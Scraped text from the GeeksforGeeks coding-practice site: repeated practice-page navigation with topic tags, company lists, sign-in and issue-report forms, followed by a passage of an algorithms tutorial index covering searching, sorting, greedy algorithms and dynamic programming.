Solutions Netskope Swiggy Infinera Arcesium Dailyhunt CGI Wooker Monotype Solutions Informatica redBus Zomato Freshokartz Sprinklr IgniteWorld Medlife Target Corporation Citicorp Xome HunanAsset Unisys Zycus HCL Mahindra Comviva Dell Cadence India Cavisson System Komli Media Motlay Yodlee Infotech HSBC PropTiger American Express Taxi4Sure PlaySimple Lybrate Huawei Open Solutions KLA Tencor Amadeus Labs Mallow Technologies Thoughtworks Practo MindFire Solutions eBay Zopper FreeCharge Knowlarity Code Brew Problem Type Full Problems Function Problems Difficulty School Basic Easy Medium Hard Page Sort By Submissions Accuracy Newest Company Tags Amazon Microsoft Adobe Samsung Accolite more>> Topic Tags Mathematical Arrays Strings Dynamic Programming Hash more>> CLEAR ALL × Message Error Okay! × Please report if you are facing any issue on this page. Issue Type * Select Issue Content Related Issue Sofware Related Issue Examples of Content related issues .Software related issues .For queries regarding questions and quizzes, use the comment area below respective pages. Describe Your Issue * Attach Screenshot (optional) Send Close room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved

Practice | GeeksforGeeks | A computer science portal for geeks Geeksforgeeks close Problems Courses Get Hired close Sign In Sign In Problems Courses Get Hired Discussion ▲ × × Message Error OK × Note: For issues in your code/test-cases, please use Comment-System of that particular problem. Details Cancel Send × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password If you are facing any issue or this is taking too long, please click to join directly. Exit × Mathematical Arrays Strings Dynamic Programming Hash Sorting Bit Magic Matrix Tree Greedy Java Searching Stack CPP STL Graph Prime Number Recursion Linked List Heap Numbers Misc number-theory sieve Binary Search Binary Search Tree Modular Arithmetic Queue DFS Java-Collections Combinatorial priority-queue series Map sliding-window Fibonacci logical-thinking Backtracking Segment-Tree BFS Divide and Conquer two-pointer-algorithm palindrome Geometric permutation Trie pattern-printing Binary Representation factorial Practice-Problems Tutorial-Problems Game Theory python-loops python-io Algorithms Traversal doubly-linked-list constructive algo implementation prefix-sum modular arithmetic Operators Division OOP python-operators python-list python-strings Regular Expression set subset Data Type Disjoint Set Date-Time Pattern Searching python-conditionals Kadane Factorization circular-linked-list Data Structures Java-Strings logarithm python-functions python Class inclusion-exclusion Functions Puzzles Java-BigInteger Probability Gauss Elimination Java-Class and Object Range Minimum Query Binary Indexed Tree Shortest Path Physics Merge Sort CPP-Control-Flow cryptography Lazy Propagation alphabets Quantifiers cpp-strings Java-Control-Flow Pointers union-find anagram circular linked list Character Encoding cpp-operator python-set Sqrt Decomposition analytics Reverse cpp-pointers python-dict Java-Operators mod C composite LCS Operating Systems Graph colouring quotient quadratic Computer Networks AVL-Tree Machine Learning Super Increasing Seq Structures CPP-Control-Flow Match Making permutatuins radix sort c-lang × Amazon Microsoft Adobe Samsung Accolite Zoho Paytm Goldman Sachs Snapdeal MakeMyTrip Google Flipkart Morgan Stanley Walmart FactSet OYO Rooms D-E-Shaw Ola Cabs SAP Labs Oracle Hike MAQ Software Directi VMWare Facebook Visa Cisco Qualcomm Linkedin Intuit Wipro Yahoo Payu BankBazaar TCS Codenation Yatra.com Housing.com Citrix Salesforce InMobi PayPal ABCO Synopsys Rockstand Times Internet Twitter Myntra Infosys Moonfrog Labs Teradata Accenture 24*7 Innovation Labs Nagarro Drishti-Soft Groupon GE InfoEdge One97 Juniper Networks Nutanix Opera CarWale Expedia Quikr Oxigen Wallet Epic Systems Boomerang Commerce Brocade Zillious Streamoid Technologies TinyOwl Aricent Amdocs OATS Systems BrowserStack Jabong Polycom Belzabar Apple Kritikal Solutions GreyOrange IBM Philips CouponDunia Airtel Fab.com Cognizant United Health Group Grofers MetLife Bloomberg Service Now National Instruments Veritas nearbuy Sapient Junglee Games Tesco Tejas Network Nvidia Mobicip Rivigo Intel Pubmatic Bidgely Kuliza Vizury Interactive Solutions Netskope Swiggy Infinera Arcesium Dailyhunt CGI Wooker Monotype Solutions Informatica redBus Zomato Freshokartz Sprinklr IgniteWorld Medlife Target Corporation Citicorp Xome HunanAsset Unisys Zycus HCL Mahindra Comviva Dell Cadence India Cavisson System Komli Media Motlay Yodlee Infotech HSBC PropTiger American Express Taxi4Sure PlaySimple Lybrate Huawei Open Solutions KLA Tencor Amadeus Labs Mallow Technologies Thoughtworks Practo MindFire Solutions eBay Zopper FreeCharge Knowlarity Code Brew Problem Type Full Problems Function Problems Difficulty School Basic Easy Medium Hard Page Sort By Submissions Accuracy Newest Company Tags Amazon Microsoft Adobe Samsung Accolite more>> Topic Tags Mathematical Arrays Strings Dynamic Programming Hash more>> CLEAR ALL × Message Error Okay! × Please report if you are facing any issue on this page. Issue Type * Select Issue Content Related Issue Sofware Related Issue Examples of Content related issues .Software related issues .For queries regarding questions and quizzes, use the comment area below respective pages. Describe Your Issue * Attach Screenshot (optional) Send Close room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved

Practice | GeeksforGeeks | A computer science portal for geeks Geeksforgeeks close Problems Courses Get Hired close Sign In Sign In Problems Courses Get Hired Discussion ▲ × × Message Error OK × Note: For issues in your code/test-cases, please use Comment-System of that particular problem. Details Cancel Send × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password If you are facing any issue or this is taking too long, please click to join directly. Exit × Mathematical Arrays Strings Dynamic Programming Hash Sorting Bit Magic Matrix Tree Greedy Java Searching Stack CPP STL Graph Prime Number Recursion Linked List Heap Numbers Misc number-theory sieve Binary Search Binary Search Tree Modular Arithmetic Queue DFS Java-Collections Combinatorial priority-queue series Map sliding-window Fibonacci logical-thinking Backtracking Segment-Tree BFS Divide and Conquer two-pointer-algorithm palindrome Geometric permutation Trie pattern-printing Binary Representation factorial Practice-Problems Tutorial-Problems Game Theory python-loops python-io Algorithms Traversal doubly-linked-list constructive algo implementation prefix-sum modular arithmetic Operators Division OOP python-operators python-list python-strings Regular Expression set subset Data Type Disjoint Set Date-Time Pattern Searching python-conditionals Kadane Factorization circular-linked-list Data Structures Java-Strings logarithm python-functions python Class inclusion-exclusion Functions Puzzles Java-BigInteger Probability Gauss Elimination Java-Class and Object Range Minimum Query Binary Indexed Tree Shortest Path Physics Merge Sort CPP-Control-Flow cryptography Lazy Propagation alphabets Quantifiers cpp-strings Java-Control-Flow Pointers union-find anagram circular linked list Character Encoding cpp-operator python-set Sqrt Decomposition analytics Reverse cpp-pointers python-dict Java-Operators mod C composite LCS Operating Systems Graph colouring quotient quadratic Computer Networks AVL-Tree Machine Learning Super Increasing Seq Structures CPP-Control-Flow Match Making permutatuins radix sort c-lang × Amazon Microsoft Adobe Samsung Accolite Zoho Paytm Goldman Sachs Snapdeal MakeMyTrip Google Flipkart Morgan Stanley Walmart FactSet OYO Rooms D-E-Shaw Ola Cabs SAP Labs Oracle Hike MAQ Software Directi VMWare Facebook Visa Cisco Qualcomm Linkedin Intuit Wipro Yahoo Payu BankBazaar TCS Codenation Yatra.com Housing.com Citrix Salesforce InMobi PayPal ABCO Synopsys Rockstand Times Internet Twitter Myntra Infosys Moonfrog Labs Teradata Accenture 24*7 Innovation Labs Nagarro Drishti-Soft Groupon GE InfoEdge One97 Juniper Networks Nutanix Opera CarWale Expedia Quikr Oxigen Wallet Epic Systems Boomerang Commerce Brocade Zillious Streamoid Technologies TinyOwl Aricent Amdocs OATS Systems BrowserStack Jabong Polycom Belzabar Apple Kritikal Solutions GreyOrange IBM Philips CouponDunia Airtel Fab.com Cognizant United Health Group Grofers MetLife Bloomberg Service Now National Instruments Veritas nearbuy Sapient Junglee Games Tesco Tejas Network Nvidia Mobicip Rivigo Intel Pubmatic Bidgely Kuliza Vizury Interactive Solutions Netskope Swiggy Infinera Arcesium Dailyhunt CGI Wooker Monotype Solutions Informatica redBus Zomato Freshokartz Sprinklr IgniteWorld Medlife Target Corporation Citicorp Xome HunanAsset Unisys Zycus HCL Mahindra Comviva Dell Cadence India Cavisson System Komli Media Motlay Yodlee Infotech HSBC PropTiger American Express Taxi4Sure PlaySimple Lybrate Huawei Open Solutions KLA Tencor Amadeus Labs Mallow Technologies Thoughtworks Practo MindFire Solutions eBay Zopper FreeCharge Knowlarity Code Brew Problem Type Full Problems Function Problems Difficulty School Basic Easy Medium Hard Page Sort By Submissions Accuracy Newest Company Tags Amazon Microsoft Adobe Samsung Accolite more>> Topic Tags Mathematical Arrays Strings Dynamic Programming Hash more>> CLEAR ALL × Message Error Okay! × Please report if you are facing any issue on this page. Issue Type * Select Issue Content Related Issue Sofware Related Issue Examples of Content related issues .Software related issues .For queries regarding questions and quizzes, use the comment area below respective pages. Describe Your Issue * Attach Screenshot (optional) Send Close room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved

Practice | GeeksforGeeks | A computer science portal for geeks Geeksforgeeks close Problems Courses Get Hired close Sign In Sign In Problems Courses Get Hired Discussion ▲ × × Message Error OK × Note: For issues in your code/test-cases, please use Comment-System of that particular problem. Details Cancel Send × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password If you are facing any issue or this is taking too long, please click to join directly. Exit × Mathematical Arrays Strings Dynamic Programming Hash Sorting Bit Magic Matrix Tree Greedy Java Searching Stack CPP STL Graph Prime Number Recursion Linked List Heap Numbers Misc number-theory sieve Binary Search Binary Search Tree Modular Arithmetic Queue DFS Java-Collections Combinatorial priority-queue series Map sliding-window Fibonacci logical-thinking Backtracking Segment-Tree BFS Divide and Conquer two-pointer-algorithm palindrome Geometric permutation Trie pattern-printing Binary Representation factorial Practice-Problems Tutorial-Problems Game Theory python-loops python-io Algorithms Traversal doubly-linked-list constructive algo implementation prefix-sum modular arithmetic Operators Division OOP python-operators python-list python-strings Regular Expression set subset Data Type Disjoint Set Date-Time Pattern Searching python-conditionals Kadane Factorization circular-linked-list Data Structures Java-Strings logarithm python-functions python Class inclusion-exclusion Functions Puzzles Java-BigInteger Probability Gauss Elimination Java-Class and Object Range Minimum Query Binary Indexed Tree Shortest Path Physics Merge Sort CPP-Control-Flow cryptography Lazy Propagation alphabets Quantifiers cpp-strings Java-Control-Flow Pointers union-find anagram circular linked list Character Encoding cpp-operator python-set Sqrt Decomposition analytics Reverse cpp-pointers python-dict Java-Operators mod C composite LCS Operating Systems Graph colouring quotient quadratic Computer Networks AVL-Tree Machine Learning Super Increasing Seq Structures CPP-Control-Flow Match Making permutatuins radix sort c-lang × Amazon Microsoft Adobe Samsung Accolite Zoho Paytm Goldman Sachs Snapdeal MakeMyTrip Google Flipkart Morgan Stanley Walmart FactSet OYO Rooms D-E-Shaw Ola Cabs SAP Labs Oracle Hike MAQ Software Directi VMWare Facebook Visa Cisco Qualcomm Linkedin Intuit Wipro Yahoo Payu BankBazaar TCS Codenation Yatra.com Housing.com Citrix Salesforce InMobi PayPal ABCO Synopsys Rockstand Times Internet Twitter Myntra Infosys Moonfrog Labs Teradata Accenture 24*7 Innovation Labs Nagarro Drishti-Soft Groupon GE InfoEdge One97 Juniper Networks Nutanix Opera CarWale Expedia Quikr Oxigen Wallet Epic Systems Boomerang Commerce Brocade Zillious Streamoid Technologies TinyOwl Aricent Amdocs OATS Systems BrowserStack Jabong Polycom Belzabar Apple Kritikal Solutions GreyOrange IBM Philips CouponDunia Airtel Fab.com Cognizant United Health Group Grofers MetLife Bloomberg Service Now National Instruments Veritas nearbuy Sapient Junglee Games Tesco Tejas Network Nvidia Mobicip Rivigo Intel Pubmatic Bidgely Kuliza Vizury Interactive Solutions Netskope Swiggy Infinera Arcesium Dailyhunt CGI Wooker Monotype Solutions Informatica redBus Zomato Freshokartz Sprinklr IgniteWorld Medlife Target Corporation Citicorp Xome HunanAsset Unisys Zycus HCL Mahindra Comviva Dell Cadence India Cavisson System Komli Media Motlay Yodlee Infotech HSBC PropTiger American Express Taxi4Sure PlaySimple Lybrate Huawei Open Solutions KLA Tencor Amadeus Labs Mallow Technologies Thoughtworks Practo MindFire Solutions eBay Zopper FreeCharge Knowlarity Code Brew Problem Type Full Problems Function Problems Difficulty School Basic Easy Medium Hard Page Sort By Submissions Accuracy Newest Company Tags Amazon Microsoft Adobe Samsung Accolite more>> Topic Tags Mathematical Arrays Strings Dynamic Programming Hash more>> CLEAR ALL × Message Error Okay! × Please report if you are facing any issue on this page. Issue Type * Select Issue Content Related Issue Sofware Related Issue Examples of Content related issues .Software related issues .For queries regarding questions and quizzes, use the comment area below respective pages. Describe Your Issue * Attach Screenshot (optional) Send Close room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved

Practice | GeeksforGeeks | A computer science portal for geeks Geeksforgeeks close Problems Courses Get Hired close Sign In Sign In Problems Courses Get Hired Discussion ▲ × × Message Error OK × Note: For issues in your code/test-cases, please use Comment-System of that particular problem. Details Cancel Send × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password If you are facing any issue or this is taking too long, please click to join directly. Exit × Mathematical Arrays Strings Dynamic Programming Hash Sorting Bit Magic Matrix Tree Greedy Java Searching Stack CPP STL Graph Prime Number Recursion Linked List Heap Numbers Misc number-theory sieve Binary Search Binary Search Tree Modular Arithmetic Queue DFS Java-Collections Combinatorial priority-queue series Map sliding-window Fibonacci logical-thinking Backtracking Segment-Tree BFS Divide and Conquer two-pointer-algorithm palindrome Geometric permutation Trie pattern-printing Binary Representation factorial Practice-Problems Tutorial-Problems Game Theory python-loops python-io Algorithms Traversal doubly-linked-list constructive algo implementation prefix-sum modular arithmetic Operators Division OOP python-operators python-list python-strings Regular Expression set subset Data Type Disjoint Set Date-Time Pattern Searching python-conditionals Kadane Factorization circular-linked-list Data Structures Java-Strings logarithm python-functions python Class inclusion-exclusion Functions Puzzles Java-BigInteger Probability Gauss Elimination Java-Class and Object Range Minimum Query Binary Indexed Tree Shortest Path Physics Merge Sort CPP-Control-Flow cryptography Lazy Propagation alphabets Quantifiers cpp-strings Java-Control-Flow Pointers union-find anagram circular linked list Character Encoding cpp-operator python-set Sqrt Decomposition analytics Reverse cpp-pointers python-dict Java-Operators mod C composite LCS Operating Systems Graph colouring quotient quadratic Computer Networks AVL-Tree Machine Learning Super Increasing Seq Structures CPP-Control-Flow Match Making permutatuins radix sort c-lang × Amazon Microsoft Adobe Samsung Accolite Zoho Paytm Goldman Sachs Snapdeal MakeMyTrip Google Flipkart Morgan Stanley Walmart FactSet OYO Rooms D-E-Shaw Ola Cabs SAP Labs Oracle Hike MAQ Software Directi VMWare Facebook Visa Cisco Qualcomm Linkedin Intuit Wipro Yahoo Payu BankBazaar TCS Codenation Yatra.com Housing.com Citrix Salesforce InMobi PayPal ABCO Synopsys Rockstand Times Internet Twitter Myntra Infosys Moonfrog Labs Teradata Accenture 24*7 Innovation Labs Nagarro Drishti-Soft Groupon GE InfoEdge One97 Juniper Networks Nutanix Opera CarWale Expedia Quikr Oxigen Wallet Epic Systems Boomerang Commerce Brocade Zillious Streamoid Technologies TinyOwl Aricent Amdocs OATS Systems BrowserStack Jabong Polycom Belzabar Apple Kritikal Solutions GreyOrange IBM Philips CouponDunia Airtel Fab.com Cognizant United Health Group Grofers MetLife Bloomberg Service Now National Instruments Veritas nearbuy Sapient Junglee Games Tesco Tejas Network Nvidia Mobicip Rivigo Intel Pubmatic Bidgely Kuliza Vizury Interactive Solutions Netskope Swiggy Infinera Arcesium Dailyhunt CGI Wooker Monotype Solutions Informatica redBus Zomato Freshokartz Sprinklr IgniteWorld Medlife Target Corporation Citicorp Xome HunanAsset Unisys Zycus HCL Mahindra Comviva Dell Cadence India Cavisson System Komli Media Motlay Yodlee Infotech HSBC PropTiger American Express Taxi4Sure PlaySimple Lybrate Huawei Open Solutions KLA Tencor Amadeus Labs Mallow Technologies Thoughtworks Practo MindFire Solutions eBay Zopper FreeCharge Knowlarity Code Brew Problem Type Full Problems Function Problems Difficulty School Basic Easy Medium Hard Page Sort By Submissions Accuracy Newest Company Tags Amazon Microsoft Adobe Samsung Accolite more>> Topic Tags Mathematical Arrays Strings Dynamic Programming Hash more>> CLEAR ALL × Message Error Okay! × Please report if you are facing any issue on this page. Issue Type * Select Issue Content Related Issue Sofware Related Issue Examples of Content related issues .Software related issues .For queries regarding questions and quizzes, use the comment area below respective pages. Describe Your Issue * Attach Screenshot (optional) Send Close room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved

Practice | GeeksforGeeks | A computer science portal for geeks Geeksforgeeks close Problems Courses Get Hired close Sign In Sign In Problems Courses Get Hired Discussion ▲ × × Message Error OK × Note: For issues in your code/test-cases, please use Comment-System of that particular problem. Details Cancel Send × Sign In Sign Up account_circle lock Remember me Forgot Password Sign In email lock business Sign Up or Google Facebook LinkedIn GitHub Why Create an Account? By creating this account, you agree to our Privacy Policy & Cookie Policy. Please enter your email address or userHandle. account_circle Back to Login Reset Password If you are facing any issue or this is taking too long, please click to join directly. Exit × Mathematical Arrays Strings Dynamic Programming Hash Sorting Bit Magic Matrix Tree Greedy Java Searching Stack CPP STL Graph Prime Number Recursion Linked List Heap Numbers Misc number-theory sieve Binary Search Binary Search Tree Modular Arithmetic Queue DFS Java-Collections Combinatorial priority-queue series Map sliding-window Fibonacci logical-thinking Backtracking Segment-Tree BFS Divide and Conquer two-pointer-algorithm palindrome Geometric permutation Trie pattern-printing Binary Representation factorial Practice-Problems Tutorial-Problems Game Theory python-loops python-io Algorithms Traversal doubly-linked-list constructive algo implementation prefix-sum modular arithmetic Operators Division OOP python-operators python-list python-strings Regular Expression set subset Data Type Disjoint Set Date-Time Pattern Searching python-conditionals Kadane Factorization circular-linked-list Data Structures Java-Strings logarithm python-functions python Class inclusion-exclusion Functions Puzzles Java-BigInteger Probability Gauss Elimination Java-Class and Object Range Minimum Query Binary Indexed Tree Shortest Path Physics Merge Sort CPP-Control-Flow cryptography Lazy Propagation alphabets Quantifiers cpp-strings Java-Control-Flow Pointers union-find anagram circular linked list Character Encoding cpp-operator python-set Sqrt Decomposition analytics Reverse cpp-pointers python-dict Java-Operators mod C composite LCS Operating Systems Graph colouring quotient quadratic Computer Networks AVL-Tree Machine Learning Super Increasing Seq Structures CPP-Control-Flow Match Making permutatuins radix sort c-lang × Amazon Microsoft Adobe Samsung Accolite Zoho Paytm Goldman Sachs Snapdeal MakeMyTrip Google Flipkart Morgan Stanley Walmart FactSet OYO Rooms D-E-Shaw Ola Cabs SAP Labs Oracle Hike MAQ Software Directi VMWare Facebook Visa Cisco Qualcomm Linkedin Intuit Wipro Yahoo Payu BankBazaar TCS Codenation Yatra.com Housing.com Citrix Salesforce InMobi PayPal ABCO Synopsys Rockstand Times Internet Twitter Myntra Infosys Moonfrog Labs Teradata Accenture 24*7 Innovation Labs Nagarro Drishti-Soft Groupon GE InfoEdge One97 Juniper Networks Nutanix Opera CarWale Expedia Quikr Oxigen Wallet Epic Systems Boomerang Commerce Brocade Zillious Streamoid Technologies TinyOwl Aricent Amdocs OATS Systems BrowserStack Jabong Polycom Belzabar Apple Kritikal Solutions GreyOrange IBM Philips CouponDunia Airtel Fab.com Cognizant United Health Group Grofers MetLife Bloomberg Service Now National Instruments Veritas nearbuy Sapient Junglee Games Tesco Tejas Network Nvidia Mobicip Rivigo Intel Pubmatic Bidgely Kuliza Vizury Interactive Solutions Netskope Swiggy Infinera Arcesium Dailyhunt CGI Wooker Monotype Solutions Informatica redBus Zomato Freshokartz Sprinklr IgniteWorld Medlife Target Corporation Citicorp Xome HunanAsset Unisys Zycus HCL Mahindra Comviva Dell Cadence India Cavisson System Komli Media Motlay Yodlee Infotech HSBC PropTiger American Express Taxi4Sure PlaySimple Lybrate Huawei Open Solutions KLA Tencor Amadeus Labs Mallow Technologies Thoughtworks Practo MindFire Solutions eBay Zopper FreeCharge Knowlarity Code Brew Problem Type Full Problems Function Problems Difficulty School Basic Easy Medium Hard Page Sort By Submissions Accuracy Newest Company Tags Amazon Microsoft Adobe Samsung Accolite more>> Topic Tags Mathematical Arrays Strings Dynamic Programming Hash more>> CLEAR ALL × Message Error Okay! × Please report if you are facing any issue on this page. Issue Type * Select Issue Content Related Issue Sofware Related Issue Examples of Content related issues .Software related issues .For queries regarding questions and quizzes, use the comment area below respective pages. Describe Your Issue * Attach Screenshot (optional) Send Close room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved

Algorithms - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Algorithms Topics : Analysis of Algorithms Searching and Sorting Greedy Algorithms Dynamic Programming Pattern Searching Other String Algorithms Backtracking Divide and Conquer Geometric Algorithms Mathematical Algorithms Bit Algorithms Graph Algorithms Randomized Algorithms Branch and Bound Quizzes on Algorithms Misc Analysis of Algorithms: Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does ‘Space Complexity’ mean? Pseudo-polynomial Algorithms NP-Completeness Introduction Polynomial Time Approximation Scheme A Time Complexity Question Time Complexity of building a heap Time Complexity where loop variable is incremented by 1, 2, 3, 4 .. Time Complexity of Loop with Powers Performance of loops (A caching question) Recent Articles on Analysis of Algorithms Quiz on Analysis of Algorithms Quiz on Recurrences Searching and Sorting: Linear Search, Binary Search, Jump Search, Interpolation Search, Exponential Search, Ternary Search Selection Sort, Bubble Sort, Insertion Sort, Merge Sort, Heap Sort, QuickSort, Radix Sort, Counting Sort, Bucket Sort, ShellSort, Comb Sort, Pigeonhole Sort, Cycle Sort Interpolation search vs Binary search Stability in sorting algorithms When does the worst case of Quicksort occur? Lower bound for comparison based sorting algorithms Which sorting algorithm makes minimum number of memory writes? Find the Minimum length Unsorted Subarray, sorting which makes the complete array sorted Merge Sort for Linked Lists Sort a nearly sorted (or K sorted) array Iterative Quick Sort QuickSort on Singly Linked List QuickSort on Doubly Linked List Find k closest elements to a given value Sort n numbers in range from 0 to n^2 – 1 in linear time A Problem in Many Binary Search Implementations Search in an almost sorted array Sort an array in wave form Why is Binary Search preferred over Ternary Search? K’th Smallest/Largest Element in Unsorted Array K’th Smallest/Largest Element in Unsorted Array in Expected Linear Time K’th Smallest/Largest Element in Unsorted Array in Worst Case Linear Time Find the closest pair from two sorted arrays Find common elements in three sorted arrays Given a sorted array and a number x, find the pair in array whose sum is closest to x Count 1’s in a sorted binary array Binary Insertion Sort Insertion Sort for Singly Linked List Why Quick Sort preferred for Arrays and Merge Sort for Linked Lists? Merge Sort for Doubly Linked List Minimum adjacent swaps to move maximum and minimum to corners Recent Articles on Searching Recent Articles on Sorting Quiz on Searching Quiz on Sorting Coding Practice on Searching Coding Practice on Sorting Greedy Algorithms: Activity Selection Problem Kruskal’s Minimum Spanning Tree Algorithm Huffman Coding Efficient Huffman Coding for Sorted Input Prim’s Minimum Spanning Tree Algorithm Prim’s MST for Adjacency List Representation Dijkstra’s Shortest Path Algorithm Dijkstra’s Algorithm for Adjacency List Representation Job Sequencing Problem Quiz on Greedy Algorithms Greedy Algorithm to find Minimum number of Coins K Centers Problem Minimum Number of Platforms Required for a Railway/Bus Station Recent Articles on Greedy Algorithms Quiz on Greedy Algorithms Coding Practice on Greedy Algorithms Dynamic Programming: Overlapping Subproblems Property Optimal Substructure Property Longest Increasing Subsequence Longest Common Subsequence Edit Distance Min Cost Path Coin Change Matrix Chain Multiplication Binomial Coefficient 0-1 Knapsack Problem Egg Dropping Puzzle Longest Palindromic Subsequence Cutting a Rod Maximum Sum Increasing Subsequence Longest Bitonic Subsequence Floyd Warshall Algorithm Palindrome Partitioning Partition problem Word Wrap Problem Maximum Length Chain of Pairs Variations of LIS Box Stacking Problem Program for Fibonacci numbers Minimum number of jumps to reach end Maximum size square sub-matrix with all 1s Ugly Numbers Largest Sum Contiguous Subarray Longest Palindromic Substring Bellman–Ford Algorithm for Shortest Paths Optimal 